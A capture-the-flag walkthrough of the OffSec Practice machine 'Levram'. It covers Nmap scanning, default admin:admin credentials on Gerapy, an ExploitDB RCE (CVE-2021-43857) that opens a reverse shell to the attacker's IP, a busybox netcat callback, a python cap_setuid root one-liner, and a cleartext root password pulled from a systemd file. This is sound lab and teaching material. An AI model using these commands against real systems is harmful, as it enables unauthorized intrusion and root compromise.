# Levram: Offsec Practice's Walkthrough

## Introduction

Levram is an Offsec Practice machine that tests your ability to move from simple service discovery to full system compromise by chaining a webapp vulnerability with local privilege escalation. In this write-up I enumerate the target with Nmap, interact with the web service running on port 8000 (Gerapy), and gain initial access using an authenticated RCE exploit (CVE-2021-43857) after discovering default credentials. From the resulting shell I stabilize access, run automated and manual enumeration, and escalate to root using two different methods: abusing python3.10 capabilities (cap_setuid=ep) and discovering a clear-text root password in a systemd service file. The walkthrough documents the commands, thought process, and small gotchas (e.g., creating a project so the exploit works), so you can reproduce the steps.

## Machine Enumeration

Run the Nmap scan and discover the open ports.

```text
┌──(kali㉿kali)-[~/offsec/Prctice/Levram]
└─$ nmap -sC -sV 192.168.193.24 -oN nmap.init.txt                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 15:44 EDT
Nmap scan report for 192.168.193.24
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-title: Gerapy
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds
```

Start looking in port 8000 for the HTTP service on the browser and put the Nmap all-ports scan in the background.

![Port 8000 HTTP Browser](https://github.com/het-desai/Offsec-CTF/blob/main/Practice/Levram/screenshots/port8000httpbrower.png "Port 8000 HTTP Brower")

```text
┌──(kali㉿kali)-[~/offsec/Prctice/Levram]
└─$ nmap -p- 192.168.193.24 -oN nmap.all.ports.txt                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 15:45 EDT
Nmap scan report for 192.168.193.24
Host is up (0.0087s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 18.50 seconds
```

I tried the default credentials `admin:admin and it worked.

## Initial Access

Google search about this web application.

Google search: `Gerapy exploit`

![Google Gerapy Exploit Result](https://github.com/het-desai/Offsec-CTF/blob/main/Practice/Levram/screenshots/googlegerapyexploitresult.png "Google Gerapy Exploit Result")

Exploit URL: [ExploitDB: Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50640)

Downloaded the exploit and ran it and got an error.

```text
┌──(venv)─(kali㉿kali)-[~/offsec/Prctice/Levram/exploit]
└─$ python3 50640.py -t 192.168.193.24 -p 8000 -L 192.168.45.239 -P 50505
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / / 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /  
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____//_/   
                                                                              

Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
Traceback (most recent call last):
  File "/home/kali/offsec/Prctice/Levram/exploit/50640.py", line 130, in <module>
    exp.exploitation()
    ~~~~~~~~~~~~~~~~^^
  File "/home/kali/offsec/Prctice/Levram/exploit/50640.py", line 76, in exploitation
    name = dict3[0]['name']
           ~~~~~^^^
IndexError: list index out of range
```

After reviewing the code, I realized that the program is looking for a project listed in the Project tab. So, I created a project directory in the Project tab.

![Test Project Create Dialogbox](https://github.com/het-desai/Offsec-CTF/blob/main/Practice/Levram/screenshots/testprojectcreatedialogbox.png "Test Project Create Dialogbox")

![Test Project Created](https://github.com/het-desai/Offsec-CTF/blob/main/Practice/Levram/screenshots/testprojectcreated.png "Test Project Created")

Now I ran the exploit again, and it worked this time.

```text
┌──(venv)─(kali㉿kali)-[~/offsec/Prctice/Levram/exploit]
└─$ python3 50640.py -t 192.168.193.24 -p 8000 -L 192.168.45.239 -P 50505
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / / 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /  
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____//_/   
                                                                              

Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
[*] Found project: test
[*] Getting the ID of the project to build the URL
[*] Found ID of the project:  2
[*] Setting up a netcat listener
listening on [any] 50505 ...
[*] Executing reverse shell payload
[*] Watchout for shell! :)
connect to [192.168.45.239] from (UNKNOWN) [192.168.193.24] 52674
bash: cannot set terminal process group (844): Inappropriate ioctl for device
bash: no job control in this shell
app@ubuntu:~/gerapy$ id
id
uid=1000(app) gid=1000(app) groups=1000(app)
```

## Privilege Escalation

As I landed into the system, I made my reverse shell stable using busybox.

I ran the command as mentioned below.

```text
---Terminal 1---
app@ubuntu:~/gerapy$ id
id
uid=1000(app) gid=1000(app) groups=1000(app)
app@ubuntu:~/gerapy$ busybox nc 192.168.45.239 50506
...
...
...

---Terminal 2---
┌──(kali㉿kali)-[~/offsec/Prctice/Levram/exploit]
└─$ nc -lnvp 50506
connect to [192.168.45.239] from (UNKNOWN) [192.168.193.24] 52675
app@ubuntu:~/gerapy$ python3 -c 'import pty;pty.spawn("/bin/bash")'
app@ubuntu:~/gerapy$ export TERM=xterm

[Ctrl + Z]

┌──(kali㉿kali)-[~/offsec/Prctice/Levram/exploit]
└─$ stty raw -echo; fg
app@ubuntu:~/gerapy$
```

As soon as I landed in the stable shell, I ran the linpeas.sh script in the background and started manual enumeration for privilege escalation. Below in Method 1 is the snapshot of linpeas output, which I was thinking was interesting at the enumeration time.

### Method 1: Using Python Capabilities

```
Files with capabilities (limited to 50):
/snap/core20/1518/usr/bin/ping cap_net_raw=ep
/snap/core20/1891/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep


╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/syslog
/var/log/kern.log
/var/log/journal/43fddd5fdaac48989c811e81838aeb4d/system.journal
/var/log/journal/43fddd5fdaac48989c811e81838aeb4d/user-1000.journal
/var/log/auth.log
/home/app/snap/lxd/common/config/config.yml
/home/app/.gnupg/pubring.kbx
/home/app/.gnupg/trustdb.gpg
```

I saw the linpeas output and checked the capabilities in Google.

Google search: `/usr/bin/python3.10 cap_setuid=ep privilege escalation`

![Google Search Python Privilege Escalation](googlepythonprivesca.png "Google Search Python Privilege Escalation")

![GTFOBins Exploit](gtfobinsexploit.png "GTFOBins Exploit")

```text
app@ubuntu:/tmp$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=1000(app) groups=1000(app)
# cat /root/proof.txt
794753406795414dc9bed3ff561cc4f8
```

### Method 2: Credentials in Service File

After I finished my CTF. I checked the official walkthrough to see how they solved the challenge. I found a way that the root password is stored in the service file. The way of enumeration is to first check the running service and service file.

```
$ systemctl status app
app.service - Gerapy app service
     Loaded: loaded (/etc/systemd/system/app.service; enabled; vendor preset: enabled)
     Active: active (running) since Fri 2023-06-16 03:59:42 CST; 2 weeks 3 days ago
   Main PID: 845 (bash)
      Tasks: 11 (limit: 2234)
     Memory: 119.3M

...
```

This service file location is `/etc/systemd/system/app.service`

In this service file, the password is written in clear text as a comment.

```
$ cat /etc/systemd/system/app.service
[Unit]
Description=Gerapy app service

# root:4!m?C%7k@Xb?XNH0!>6K

[Service]
User=app
Type=simple
ExecStart=/bin/bash /home/app/run.sh


[Install]
WantedBy=multi-user.target
```

Now just switch user to root and try this new password.

```
$ su root
Password: 4!m?C%7k@Xb?XNH0!>6K
bash -i
bash: cannot set terminal process group (845): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/home/app/gerapy# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## Conclusion

This box shows how small misconfigurations chain into full compromise, default credentials on the Gerapy admin panel allowed authenticated RCE (CVE-2021-43857) after a minor UI prerequisite, and once on the host two easy privilege-escalation paths existed (a python3.10 binary with cap_setuid=ep and a plaintext root password left in a systemd service file), any of which yields root and the proof.txt. The core lessons are simple: remove/default creds, patch webapps, audit binary capabilities and service files, and never store secrets in clear text.